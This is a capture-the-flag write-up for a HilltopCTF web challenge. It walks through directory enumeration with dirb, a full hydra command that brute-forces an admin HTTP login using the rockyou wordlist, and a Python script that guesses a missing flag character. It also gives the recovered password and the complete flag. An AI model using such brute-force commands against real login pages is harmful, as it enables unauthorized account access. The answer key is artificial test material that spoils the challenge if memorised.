# **Fuzzy**
## Points: 25
### **Description:** For this challenge, you visit this [website](http://shellserver1.hilltopctf.masterwayz.nl:39354). Once you've found the flag, submit it to [http://shellserver1.hilltopctf.masterwayz.nl:39354/verify/flag-here](http://shellserver1.hilltopctf.masterwayz.nl:39354/verify/flag-here) to verify that it's correct. Replace flag-here with the flag that you want to test. Good luck!

First, I used dirb to find subdomains. I found /email, which when visiting, has an HTTP authentication form. It tells us that the username is admin, but we have to find the password. 
I used hydra to brute force the login. I used this command: `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 39354 -f shellserver1.hilltopctf.masterwayz.nl http-get /email`

Hydra found that the password for the _admin_ username was _michelle_. Logging in, it gives us the flag, although one character is corrupted. 
This is what it says:

```root@hihi:~ # cat corrupted.txt
HilltopCTF{FuzzyFuzzyFuzzyFuzzyFuzzy!_08b353dc330dcad5734172ff5009f5e6b3826d49fa7243f3e598effb85bef982}

# It's not really corrupted. But I would like to annoy you a bit and let you guess the ASCII printable character or Extended ASCII character. It replaces the ! in the flag.
```

To find the "corrupted" character, I wrote a python script that tried every character. 

```python
import requests

characters = """abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()~:;"'[{-_=+]}\|,<.>/?"""
for character in characters:
	flag = "HilltopCTF{FuzzyFuzzyFuzzyFuzzyFuzzy" + character + "_08b353dc330dcad5734172ff5009f5e6b3826d49fa7243f3e598effb85bef982}"
	url = """http://shellserver1.hilltopctf.masterwayz.nl:39354/verify/""" + flag
	r = requests.get(url)
	rJson = r.json()
	print(rJson, flag)

```

## **Flag:** HilltopCTF{FuzzyFuzzyFuzzyFuzzyFuzzy5_08b353dc330dcad5734172ff5009f5e6b3826d49fa7243f3e598effb85bef982}
